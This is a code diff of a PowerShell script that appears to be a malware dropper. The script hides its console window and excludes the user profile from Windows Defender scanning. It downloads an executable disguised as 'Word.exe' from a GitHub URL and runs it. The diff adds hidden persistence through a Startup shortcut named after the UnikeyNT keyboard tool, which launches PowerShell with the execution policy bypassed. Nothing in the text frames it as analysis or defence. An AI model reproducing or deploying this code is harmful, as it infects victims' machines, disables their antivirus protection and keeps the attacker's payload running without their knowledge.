@@ -4,16 +4,51 @@ public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
-function Hide-Console
-{
+
+function Hide-Console {
     $consolePtr = [Console.Window]::GetConsoleWindow()
-    #0 hide
     [Console.Window]::ShowWindow($consolePtr, 0)
 }
+
+function Test-InternetConnection {
+    try {
+        # Ping Google DNS (8.8.8.8)
+        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
+        return $pingResult
+    } catch {
+        return $false
+    }
+}
+
+function Wait-ForInternet {
+    while (-not (Test-InternetConnection)) {
+        Start-Sleep -Seconds 10
+    }
+}
+
+function Add-ToStartup {
+    $scriptPath = $MyInvocation.MyCommand.Definition
+
+    $startupFolder = [System.IO.Path]::Combine($env:AppData, "Microsoft\Windows\Start Menu\Programs\Startup")
+
+    $WshShell = New-Object -ComObject WScript.Shell
+    $shortcut = $WshShell.CreateShortcut("$startupFolder\UnikeyNT.lnk")
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $shortcut.Save()
+}
+
 Hide-Console
+
+Add-ToStartup
+
 Add-MpPreference -ExclusionPath $env:USERPROFILE
+
 $url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
 $outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
-Start-Sleep -Milliseconds 100 
+
+Wait-ForInternet
+
 Invoke-WebRequest -Uri $url -OutFile $outputFile
+
 Start-Process -FilePath $outputFile
